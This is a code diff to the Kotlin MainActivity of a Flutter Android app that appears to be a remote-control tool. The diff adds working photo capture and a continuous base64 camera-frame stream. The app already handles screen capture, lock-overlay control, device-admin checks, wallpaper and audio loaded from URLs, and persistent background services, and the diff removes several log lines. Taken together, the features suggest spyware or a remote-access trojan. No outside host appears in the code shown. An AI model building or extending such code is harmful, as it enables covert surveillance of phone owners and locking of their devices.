@@ -1,15 +1,20 @@
 package com.template.app
 
+import android.Manifest
 import android.app.Activity
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.graphics.Canvas
+import android.graphics.ImageFormat
 import android.graphics.PixelFormat
+import android.graphics.SurfaceTexture
+import android.hardware.camera2.*
 import android.hardware.camera2.CameraCharacteristics
-import android.hardware.camera2.CameraManager
 import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
 import android.media.ImageReader
@@ -19,6 +24,9 @@ import android.media.projection.MediaProjectionManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.HandlerThread
+import android.os.Looper
 import android.os.VibrationEffect
 import android.os.Vibrator
 import android.os.VibratorManager
@@ -26,6 +34,9 @@ import android.provider.Settings
 import android.util.Base64
 import android.util.DisplayMetrics
 import android.util.Log
+import android.view.Surface
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.EventChannel
@@ -38,9 +49,10 @@ class MainActivity : FlutterActivity() {
     private val CHANNEL = "orgsapp/device_info"
     private val FRAME_CHANNEL = "orgsapp/camera_frames"
 
+    // MediaPlayer untuk audio
     private var mediaPlayer: MediaPlayer? = null
 
-    // MediaProjection
+    // MediaProjection untuk screen capture
     private var mediaProjection: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
     private var imageReader: ImageReader? = null
@@ -50,12 +62,23 @@ class MainActivity : FlutterActivity() {
     private val PROJECTION_REQUEST_CODE = 1001
     private var pendingProjectionResult: MethodChannel.Result? = null
 
+    // Camera2
+    private var cameraDevice: CameraDevice? = null
+    private var captureSession: CameraCaptureSession? = null
+    private var cameraThread: HandlerThread? = null
+    private var cameraHandler: Handler? = null
+    private var cameraImageReader: ImageReader? = null
+    private var currentFacing = CameraCharacteristics.LENS_FACING_BACK
+    private var frameEventSink: EventChannel.EventSink? = null
+    private val CAMERA_PERMISSION_CODE = 2001
+    private var pendingCameraResult: MethodChannel.Result? = null
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
         Log.d("MainActivity", "🚀 onCreate")
 
-        // ⬇️ START native services (WAJIB)
+        // Start native services
         KeepAliveService.start(this)
         ConnectionService.start(this)
 
@@ -67,24 +90,59 @@ class MainActivity : FlutterActivity() {
         screenHeight = metrics.heightPixels
         screenDensity = metrics.densityDpi
 
+        // Init camera thread
+        cameraThread = HandlerThread("CameraThread").apply { start() }
+        cameraHandler = Handler(cameraThread!!.looper)
+
         // Request battery optimization exemption
         requestBatteryOptimizationExemption()
+
+        // Request camera permission
+        requestCameraPermissionIfNeeded()
     }
 
+    // ==========================================
+    // ===== CAMERA PERMISSION =====
+    // ==========================================
+    private fun requestCameraPermissionIfNeeded() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+            != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(Manifest.permission.CAMERA),
+                CAMERA_PERMISSION_CODE,
+            )
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray,
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == CAMERA_PERMISSION_CODE) {
+            val granted = grantResults.isNotEmpty() &&
+                grantResults[0] == PackageManager.PERMISSION_GRANTED
+            Log.d("MainActivity", "Camera permission: $granted")
+        }
+    }
+
+    // ==========================================
+    // ===== CONFIGURE FLUTTER ENGINE =====
+    // ==========================================
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
 
         Log.d("MainActivity", "🔧 configureFlutterEngine")
 
-        // ==========================================
-        // ===== Method Channel =====
-        // ==========================================
+        // Method Channel
         MethodChannel(
             flutterEngine.dartExecutor.binaryMessenger,
             CHANNEL,
         ).setMethodCallHandler { call, result ->
             try {
-                Log.d("MainActivity", "Method called: ${call.method}")
+                Log.d("MainActivity", "Method: ${call.method}")
                 when (call.method) {
                     // DEVICE INFO
                     "getSdkInt" -> result.success(Build.VERSION.SDK_INT)
@@ -114,16 +172,13 @@ class MainActivity : FlutterActivity() {
                     "requestScreenCapture" -> requestScreenCapture(result)
                     "stopScreenCapture" -> stopScreenCapture(result)
 
-                    // CAMERA
-                    "takePhoto" -> {
-                        Log.w("MainActivity", "takePhoto native fallback")
-                        result.success("")
-                    }
-                    "startCameraStream" -> {
-                        Log.w("MainActivity", "startCameraStream native fallback")
-                        result.success(false)
-                    }
-                    "stopCameraStream" -> result.success(true)
+                    // CAMERA - REAL
+                    "takePhoto" -> takePhoto(call.argument<String>("camera") ?: "back", result)
+                    "startCameraStream" -> startCameraStream(
+                        call.argument<String>("camera") ?: "back",
+                        result,
+                    )
+                    "stopCameraStream" -> stopCameraStream(result)
 
                     // AUDIO
                     "playAudio" -> playAudio(call.argument<String>("url"), result)
@@ -160,25 +215,304 @@ class MainActivity : FlutterActivity() {
             }
         }
 
-        // ==========================================
-        // ===== Event Channel (Camera frames) =====
-        // ==========================================
+        // Event Channel (Camera frames)
         EventChannel(
             flutterEngine.dartExecutor.binaryMessenger,
             FRAME_CHANNEL,
         ).setStreamHandler(object : EventChannel.StreamHandler {
             override fun onListen(args: Any?, sink: EventChannel.EventSink?) {
-                Log.d("MainActivity", "Camera frame stream listening")
+                frameEventSink = sink
+                Log.d("MainActivity", "📷 Camera frame stream listening")
             }
 
             override fun onCancel(args: Any?) {
-                Log.d("MainActivity", "Camera frame stream cancelled")
+                frameEventSink = null
+                Log.d("MainActivity", "📷 Camera frame stream cancelled")
             }
         })
     }
 
     // ==========================================
-    // ===== BATTERY OPTIMIZATION EXEMPTION =====
+    // ===== CAMERA — TAKE PHOTO =====
+    // ==========================================
+    private fun takePhoto(facing: String, result: MethodChannel.Result) {
+        try {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+                != PackageManager.PERMISSION_GRANTED) {
+                result.error("PERM", "Camera permission not granted", null)
+                return
+            }
+
+            pendingCameraResult = result
+            currentFacing = if (facing == "front")
+                CameraCharacteristics.LENS_FACING_FRONT
+            else
+                CameraCharacteristics.LENS_FACING_BACK
+
+            openCameraForCapture()
+        } catch (e: Exception) {
+            Log.e("MainActivity", "takePhoto error", e)
+            result.error("CAM", e.message, null)
+        }
+    }
+
+    private fun openCameraForCapture() {
+        try {
+            val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+
+            var targetCameraId: String? = null
+            for (id in manager.cameraIdList) {
+                val chars = manager.getCameraCharacteristics(id)
+                val facing = chars.get(CameraCharacteristics.LENS_FACING)
+                if (facing == currentFacing) {
+                    targetCameraId = id
+                    break
+                }
+            }
+
+            if (targetCameraId == null) {
+                pendingCameraResult?.error("CAM", "Camera not found", null)
+                pendingCameraResult = null
+                return
+            }
+
+            // Setup ImageReader
+            val chars = manager.getCameraCharacteristics(targetCameraId)
+            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+            val size = map?.getOutputSizes(ImageFormat.JPEG)?.firstOrNull()
+                ?: android.util.Size(640, 480)
+
+            cameraImageReader?.close()
+            cameraImageReader = ImageReader.newInstance(
+                size.width, size.height, ImageFormat.JPEG, 2,
+            )
+
+            cameraImageReader?.setOnImageAvailableListener({ reader ->
+                try {
+                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
+                    val buffer = image.planes[0].buffer
+                    val bytes = ByteArray(buffer.remaining())
+                    buffer.get(bytes)
+                    image.close()
+
+                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                    Log.d("MainActivity", "📸 Photo captured: ${bytes.size} bytes")
+
+                    mainHandler.post {
+                        pendingCameraResult?.success(base64)
+                        pendingCameraResult = null
+                        closeCamera()
+                    }
+                } catch (e: Exception) {
+                    Log.e("MainActivity", "ImageReader error", e)
+                    mainHandler.post {
+                        pendingCameraResult?.error("CAM", e.message, null)
+                        pendingCameraResult = null
+                        closeCamera()
+                    }
+                }
+            }, cameraHandler)
+
+            // Open camera
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+                != PackageManager.PERMISSION_GRANTED) {
+                pendingCameraResult?.error("PERM", "Camera permission denied", null)
+                pendingCameraResult = null
+                return
+            }
+
+            manager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    cameraDevice = camera
+                    createCaptureSession()
+                }
+
+                override fun onDisconnected(camera: CameraDevice) {
+                    camera.close()
+                    cameraDevice = null
+                    pendingCameraResult?.error("CAM", "Camera disconnected", null)
+                    pendingCameraResult = null
+                }
+
+                override fun onError(camera: CameraDevice, error: Int) {
+                    camera.close()
+                    cameraDevice = null
+                    pendingCameraResult?.error("CAM", "Camera error $error", null)
+                    pendingCameraResult = null
+                }
+            }, cameraHandler)
+        } catch (e: Exception) {
+            Log.e("MainActivity", "openCameraForCapture error", e)
+            pendingCameraResult?.error("CAM", e.message, null)
+            pendingCameraResult = null
+        }
+    }
+
+    private fun createCaptureSession() {
+        try {
+            val surface = cameraImageReader?.surface ?: return
+            val captureRequestBuilder = cameraDevice?.createCaptureRequest(
+                CameraDevice.TEMPLATE_STILL_CAPTURE,
+            )
+            captureRequestBuilder?.addTarget(surface)
+
+            cameraDevice?.createCaptureSession(
+                listOf(surface),
+                object : CameraCaptureSession.StateCallback() {
+                    override fun onConfigured(session: CameraCaptureSession) {
+                        captureSession = session
+                        try {
+                            session.capture(
+                                captureRequestBuilder.build(),
+                                null,
+                                cameraHandler,
+                            )
+                        } catch (e: Exception) {
+                            Log.e("MainActivity", "capture error", e)
+                        }
+                    }
+
+                    override fun onConfigureFailed(session: CameraCaptureSession) {
+                        Log.e("MainActivity", "Session configure failed")
+                        pendingCameraResult?.error("CAM", "Session configure failed", null)
+                        pendingCameraResult = null
+                    }
+                },
+                cameraHandler,
+            )
+        } catch (e: Exception) {
+            Log.e("MainActivity", "createCaptureSession error", e)
+        }
+    }
+
+    private fun closeCamera() {
+        try {
+            captureSession?.close(); captureSession = null
+            cameraDevice?.close(); cameraDevice = null
+            cameraImageReader?.close(); cameraImageReader = null
+        } catch (e: Exception) {}
+    }
+
+    // ==========================================
+    // ===== CAMERA STREAM =====
+    // ==========================================
+    private fun startCameraStream(facing: String, result: MethodChannel.Result) {
+        try {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+                != PackageManager.PERMISSION_GRANTED) {
+                result.error("PERM", "Camera permission not granted", null)
+                return
+            }
+
+            currentFacing = if (facing == "front")
+                CameraCharacteristics.LENS_FACING_FRONT
+            else
+                CameraCharacteristics.LENS_FACING_BACK
+
+            val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+
+            var targetCameraId: String? = null
+            for (id in manager.cameraIdList) {
+                val chars = manager.getCameraCharacteristics(id)
+                val lensFacing = chars.get(CameraCharacteristics.LENS_FACING)
+                if (lensFacing == currentFacing) {
+                    targetCameraId = id
+                    break
+                }
+            }
+
+            if (targetCameraId == null) {
+                result.success(false)
+                return
+            }
+
+            cameraImageReader?.close()
+            cameraImageReader = ImageReader.newInstance(
+                640, 480, ImageFormat.JPEG, 2,
+            )
+
+            cameraImageReader?.setOnImageAvailableListener({ reader ->
+                try {
+                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
+                    val buffer = image.planes[0].buffer
+                    val bytes = ByteArray(buffer.remaining())
+                    buffer.get(bytes)
+                    image.close()
+
+                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                    mainHandler.post {
+                        frameEventSink?.success(base64)
+                    }
+                } catch (e: Exception) {}
+            }, cameraHandler)
+
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+                != PackageManager.PERMISSION_GRANTED) {
+                result.success(false)
+                return
+            }
+
+            manager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    cameraDevice = camera
+                    startRepeatingCapture()
+                    result.success(true)
+                }
+
+                override fun onDisconnected(camera: CameraDevice) {
+                    camera.close()
+                    cameraDevice = null
+                    result.success(false)
+                }
+
+                override fun onError(camera: CameraDevice, error: Int) {
+                    camera.close()
+                    cameraDevice = null
+                    result.success(false)
+                }
+            }, cameraHandler)
+        } catch (e: Exception) {
+            Log.e("MainActivity", "startCameraStream error", e)
+            result.success(false)
+        }
+    }
+
+    private fun startRepeatingCapture() {
+        try {
+            val surface = cameraImageReader?.surface ?: return
+            val builder = cameraDevice?.createCaptureRequest(
+                CameraDevice.TEMPLATE_PREVIEW,
+            )
+            builder?.addTarget(surface)
+
+            cameraDevice?.createCaptureSession(
+                listOf(surface),
+                object : CameraCaptureSession.StateCallback() {
+                    override fun onConfigured(session: CameraCaptureSession) {
+                        captureSession = session
+                        try {
+                            session.setRepeatingRequest(
+                                builder.build(),
+                                null,
+                                cameraHandler,
+                            )
+                        } catch (e: Exception) {}
+                    }
+
+                    override fun onConfigureFailed(session: CameraCaptureSession) {}
+                },
+                cameraHandler,
+            )
+        } catch (e: Exception) {}
+    }
+
+    private fun stopCameraStream(result: MethodChannel.Result) {
+        closeCamera()
+        result.success(true)
+    }
+
+    // ==========================================
+    // ===== BATTERY OPTIMIZATION =====
     // ==========================================
     private fun requestBatteryOptimizationExemption() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -190,11 +524,8 @@ class MainActivity : FlutterActivity() {
                         data = Uri.parse("package:$packageName")
                     }
                     startActivity(intent)
-                    Log.d("MainActivity", "Battery opt exemption requested")
                 }
-            } catch (e: Exception) {
-                Log.e("MainActivity", "Battery opt error", e)
-            }
+            } catch (e: Exception) {}
         }
     }
 
@@ -248,10 +579,7 @@ class MainActivity : FlutterActivity() {
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                 imageReader?.surface, null, null,
             )
-            Log.d("MainActivity", "VirtualDisplay created")
-        } catch (e: Exception) {
-            Log.e("MainActivity", "Setup VD error", e)
-        }
+        } catch (e: Exception) {}
     }
 
     private fun captureScreenWithProjection(result: MethodChannel.Result) {
@@ -283,11 +611,8 @@ class MainActivity : FlutterActivity() {
             val stream = ByteArrayOutputStream()
             cropped.compress(Bitmap.CompressFormat.JPEG, 70, stream)
             val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
-
-            Log.d("MainActivity", "Screen captured (projection): ${stream.size()} bytes")
             result.success(base64)
         } catch (e: Exception) {
-            Log.e("MainActivity", "Projection error", e)
             captureScreenFallback(result)
         }
     }
@@ -356,7 +681,7 @@ class MainActivity : FlutterActivity() {
                 val conn = java.net.URL(url).openConnection()
                 conn.doInput = true; conn.connect()
                 val input = conn.getInputStream()
-                val bitmap = android.graphics.BitmapFactory.decodeStream(input)
+                val bitmap = BitmapFactory.decodeStream(input)
                 input.close()
                 if (bitmap != null) {
                     val wm = android.app.WallpaperManager.getInstance(applicationContext)
@@ -394,7 +719,9 @@ class MainActivity : FlutterActivity() {
     }
 
     private fun unlock(result: MethodChannel.Result) {
-        result.success(false)
+        // Unlock lock overlay kalau ada
+        LockOverlayManager.unlock()
+        result.success(true)
     }
 
     private fun isDeviceAdmin(result: MethodChannel.Result) {
@@ -478,10 +805,7 @@ class MainActivity : FlutterActivity() {
                     val chars = camManager.getCameraCharacteristics(id)
                     val flashAvailable: Boolean =
                         chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) ?: false
-                    if (flashAvailable) {
-                        cameraId = id
-                        break
-                    }
+                    if (flashAvailable) { cameraId = id; break }
                 } catch (e: Exception) {}
             }
             if (cameraId == null) { result.success(false); return }
@@ -606,5 +930,16 @@ class MainActivity : FlutterActivity() {
         } catch (e: Exception) {
             result.error("FR", e.message, null)
         }
+    }
+
+    // ==========================================
+    // ===== CLEANUP =====
+    // ==========================================
+    override fun onDestroy() {
+        try {
+            closeCamera()
+            cameraThread?.quitSafely()
+        } catch (e: Exception) {}
+        super.onDestroy()
     }
 }
